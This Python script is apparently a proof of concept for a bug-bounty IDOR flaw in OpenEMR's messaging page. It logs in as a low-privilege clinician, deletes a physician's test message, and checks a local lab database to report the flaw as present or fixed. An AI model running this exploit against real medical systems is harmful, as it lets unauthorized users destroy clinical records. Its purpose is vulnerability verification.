                      
""

import re
import sys
import warnings
import subprocess

import requests

warnings.filterwarnings("ignore")

                    
SENTINEL_MARKER = "NO-CVE-1-POC-SENTINEL-IDOR-TEST-f8a3b2c1"

                                                                             
               
                                                                             
BASE_URL = "http://192.168.115.88:8081"

                                                                         
PHYSICIAN_USER = "adminadmin123"
PHYSICIAN_PASS = "adminadmin123"

                                                                      
CLINICIAN_USER = "test_low"
CLINICIAN_PASS = "Test@12345"

          
DB_CONTAINER = "mydocker-db-1"
DB_USER = "root"
DB_PASS = "root"
DB_NAME = "openemr"

PROXIES = {"http": None, "https": None}
MSG_URL = f"{BASE_URL}/interface/main/messages/messages.php"


                                                                             
         
                                                                             
def info(msg):  print(f"[*] {msg}")
def ok(msg):    print(f"[+] {msg}")
def warn(msg):  print(f"[-] {msg}")
def fail(msg):  print(f"[!] {msg}")


def db_query(sql):
    ""
    try:
        result = subprocess.run(
            ["docker", "exec", DB_CONTAINER,
             "mysql", f"-u{DB_USER}", f"-p{DB_PASS}", DB_NAME, "-e", sql],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            warn(f"DB query failed: {result.stderr.strip()[:200]}")
            return None
    except Exception as e:
        warn(f"DB query exception: {e}")
        return None


def get_pnote_from_db(pnote_id):
    ""
    sql = f"SELECT id, assigned_to, deleted, activity, title, body FROM pnotes WHERE id={pnote_id};"
    output = db_query(sql)
    if output:
        lines = output.strip().split('\n')
        if len(lines) > 1:
            return lines[1]                 
    return None


def db_cleanup_sentinel():
    ""
    sql = f"UPDATE pnotes SET deleted=1 WHERE body LIKE '%{SENTINEL_MARKER}%' AND deleted=0;"
    db_query(sql)


def login(base_url, username, password):
    ""
    s = requests.Session()
    s.trust_env = False
    s.proxies = PROXIES
    r = s.post(
        f"{base_url}/interface/main/main_screen.php?auth=login&site=default",
        data={
            "new_login_session_management": "1",
            "languageChoice": "1",
            "authUser": username,
            "clearPass": password,
        },
        verify=False, timeout=15, allow_redirects=True,
    )
    if r.status_code != 200 or "logout" not in r.text.lower():
        fail(f"Login failed for '{username}'.")
        sys.exit(1)
    return s


def get_message_ids(session):
    ""
    r = session.get(
        MSG_URL,
        params={"form_active": "1"},
        verify=False, timeout=15,
    )
                                                                   
    ids = re.findall(r'name=["\']delete_id\[\]["\'][^>]*value=["\'](\d+)["\']', r.text)
    if not ids:
                                   
        ids = re.findall(r'value=["\'](\d+)["\'][^>]*name=["\']delete_id\[\]["\']', r.text)
    return [int(x) for x in ids]


def create_physician_message_with_sentinel(session, physician_user):
    ""
    r = session.post(
        MSG_URL,
        params={
            "showall": "",
            "sortby": "pnotes.date",
            "sortorder": "desc",
            "begin": "0",
            "form_active": "1",
        },
        data={
            "task":                "add",
            "note":                f"IDOR PoC test message — {SENTINEL_MARKER}",
            "noteid":              "",
            "form_note_type":      "Unassigned",
            "form_message_status": "New",
            "reply_to":            "0",
            "assigned_to":         physician_user,
        },
        verify=False, timeout=15, allow_redirects=True,
    )
                                                                  
    ids = re.findall(r'name=["\']delete_id\[\]["\'][^>]*value=["\'](\d+)["\']', r.text)
    if not ids:
        ids = re.findall(r'value=["\'](\d+)["\'][^>]*name=["\']delete_id\[\]["\']', r.text)

    if not ids:
        return None

                       
    sql = f"SELECT id FROM pnotes WHERE body LIKE '%{SENTINEL_MARKER}%' AND deleted=0 ORDER BY id DESC LIMIT 1;"
    output = db_query(sql)
    if output:
        lines = output.strip().split('\n')
        if len(lines) > 1:
            return int(lines[1])

    return max(int(x) for x in ids) if ids else None


def delete_pnote_as_clinician(session, pnote_id):
    ""
    r = session.post(
        MSG_URL,
        params={
            "showall": "",
            "sortby": "pnotes.date",
            "sortorder": "desc",
            "begin": "0",
            "form_active": "1",
        },
        data=[
            ("task",          "delete"),
            ("delete_id[]",   str(pnote_id)),
        ],
        verify=False, timeout=15, allow_redirects=True,
    )
    return r


                                                                             
          
                                                                             
def main():
    print("=" * 70)
    print("No-CVE PoC v2 (DB Enhanced) — IDOR: Delete Other User's Messages")
    print("Reference: huntr.com/bounties/52da52b8-b808-4b5d-90b1-1a6419b3ae8f")
    print("Target :", BASE_URL)
    print(f"Physician (victim)  : {PHYSICIAN_USER}")
    print(f"Clinician (attacker): {CLINICIAN_USER}")
    print(f"Sentinel Marker     : {SENTINEL_MARKER}")
    print("=" * 70)

                       
    info("Pre-cleanup: textDatabasetext ...")
    db_cleanup_sentinel()

                                                                         
    info(f"Step 1: Login as Physician '{PHYSICIAN_USER}' ...")
    phys_sess = login(BASE_URL, PHYSICIAN_USER, PHYSICIAN_PASS)
    ok(f"Authenticated as '{PHYSICIAN_USER}'")

    info("Step 1a: Creating test pnote with SENTINEL marker ...")
    target_id = create_physician_message_with_sentinel(phys_sess, PHYSICIAN_USER)
    if not target_id:
        fail("Could not create a test pnote for the Physician.")
        sys.exit(1)
    ok(f"Created pnote id={target_id} with sentinel marker")

                  
    info(f"Step 1b: Verify pnote id={target_id} in database BEFORE attack ...")
    pnote_before = get_pnote_from_db(target_id)
    if not pnote_before:
        fail(f"Cannot find pnote id={target_id} in database")
        sys.exit(1)

    print(f"  DB Record BEFORE: {pnote_before}")

                   
    fields_before = pnote_before.split('\t')
    if len(fields_before) < 3:
        fields_before = pnote_before.split()

    try:
        deleted_before = int(fields_before[2]) if len(fields_before) > 2 else 0
    except:
        deleted_before = 0

    if deleted_before == 1:
        warn(f"pnote id={target_id} already marked as deleted in DB")
    else:
        ok(f"pnote id={target_id} is active (deleted=0) in DB")

                                      
    info(f"Step 2: Login as Clinician '{CLINICIAN_USER}' (low-privilege) ...")
    clin_sess = login(BASE_URL, CLINICIAN_USER, CLINICIAN_PASS)
    ok(f"Authenticated as '{CLINICIAN_USER}'")

                                                         
    info(f"Step 3: POST task=delete with delete_id[]={target_id} "
         f"(belongs to Physician, not Clinician) ...")
    del_resp = delete_pnote_as_clinician(clin_sess, target_id)

    if del_resp.status_code == 403:
        ok(f"DELETE returned HTTP 403 → request blocked.")
                  
    elif del_resp.status_code == 302:
        loc = del_resp.headers.get("Location", "")
        if "login" in loc.lower():
            ok("Redirected to login → request blocked.")
    elif del_resp.status_code == 200:
        ok(f"POST accepted (HTTP 200) — server processed the request.")
    else:
        warn(f"Unexpected HTTP {del_resp.status_code}")

                                                                          
    info(f"Step 4: Query database for pnote id={target_id} AFTER attack (PRIMARY CHECK) ...")
    pnote_after = get_pnote_from_db(target_id)

    if not pnote_after:
        warn(f"Cannot find pnote id={target_id} in database after attack")
        print()
        print("RESULT: UNKNOWN")
        db_cleanup_sentinel()
        sys.exit(1)

    print(f"  DB Record AFTER: {pnote_after}")

                   
    fields_after = pnote_after.split('\t')
    if len(fields_after) < 3:
        fields_after = pnote_after.split()

    try:
        deleted_after = int(fields_after[2]) if len(fields_after) > 2 else 0
        assigned_to = fields_after[1] if len(fields_after) > 1 else "UNKNOWN"
    except:
        deleted_after = 0
        assigned_to = "UNKNOWN"

    print()
    print("  ┌─ Database Check (PRIMARY) ──────────────────────────────")
    print(f"  │  pnote id      : {target_id}")
    print(f"  │  assigned_to   : {assigned_to}")
    print(f"  │  deleted BEFORE: {deleted_before}")
    print(f"  │  deleted AFTER : {deleted_after}")
    print("  └─────────────────────────────────────────────────────────")
    print()

                         
    if deleted_after == 1 and assigned_to == PHYSICIAN_USER:
        ok(f"DATABASE CONFIRMS: pnote id={target_id} was deleted (deleted=1)")
        ok(f"  The message belonged to '{assigned_to}' but was deleted by '{CLINICIAN_USER}'")
        idor_confirmed_by_db = True
    elif deleted_after == 0:
        ok(f"DATABASE CONFIRMS: pnote id={target_id} is still active (deleted=0)")
        idor_confirmed_by_db = False
    else:
        warn(f"DATABASE: unexpected state deleted={deleted_after}")
        idor_confirmed_by_db = False

                                                        
    info(f"Step 5: Re-login as Physician to verify via web interface (SECONDARY CHECK) ...")
    phys_sess2 = login(BASE_URL, PHYSICIAN_USER, PHYSICIAN_PASS)
    phys_ids_after = get_message_ids(phys_sess2)

    target_still_present_in_ui = target_id in phys_ids_after

    print("  ┌─ Web Interface Check (SECONDARY) ───────────────────────")
    if phys_ids_after:
        found_in_ui = "YES" if target_still_present_in_ui else "NO"
        print(f"  │  pnote id={target_id} visible in UI: {found_in_ui}")
        print(f"  │  Total messages in Physician's inbox: {len(phys_ids_after)}")
    else:
        print("  │  (no messages in inbox)")
    print("  └─────────────────────────────────────────────────────────")
    print()

            
    db_cleanup_sentinel()

          
    print("=" * 70)
    if idor_confirmed_by_db:
        print("RESULT: VULNERABLE")
        print()
        print("  ✗ DATABASE PRIMARY CHECK: pnote.deleted=1")
        print(f"    Low-privilege user '{CLINICIAN_USER}' successfully deleted")
        print(f"    a message belonging to '{PHYSICIAN_USER}' without authorization.")
        print()
        print("  Root cause:")
        print("    messages.php calls deletePnote($id) without verifying")
        print("    that the pnote belongs to $_SESSION['authUser'].")
        print("=" * 70)
        sys.exit(0)
    else:
        print("RESULT: FIXED")
        print()
        print("  ✓ DATABASE PRIMARY CHECK: pnote.deleted=0")
        print("    The vulnerability appears to be fixed.")
        print("    Server rejected the unauthorized delete request.")
        print("=" * 70)
        sys.exit(0)


if __name__ == "__main__":
    main()
